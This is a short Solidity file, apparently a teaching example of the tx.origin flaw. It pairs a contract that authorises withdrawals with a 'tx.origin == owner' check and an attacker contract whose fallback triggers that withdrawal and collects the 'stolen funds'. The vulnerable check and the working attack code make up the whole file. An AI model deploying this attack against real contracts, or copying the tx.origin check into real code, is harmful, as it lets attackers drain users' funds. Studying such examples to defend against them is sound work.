pragma solidity ^0.8.0;

contract TxOriginVulnerable {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    fallback() external payable {}

    //...................other lines of code

    //withdraw all ether from the contract
    function Withdraw() public {
        require(tx.origin == owner, "Not owner");
        msg.sender.call{value: address(this).balance}("");
    }
}

contract txOriginAttacker {
    address public attacker;
    TxOriginVulnerable txOriginVulnerable;

    constructor(TxOriginVulnerable _txOriginVulnerable) {
        txOriginVulnerable = TxOriginVulnerable(_txOriginVulnerable);
        attacker = msg.sender;
    }

    fallback() external payable {
        Attack();
    }

    //...................other lines of code

    //withdraw all ether from the contract
    function Attack() internal {
        txOriginVulnerable.Withdraw();
    }

    function withdrawStolenFunds() public {
        payable(attacker).transfer(address(this).balance);
    }
}
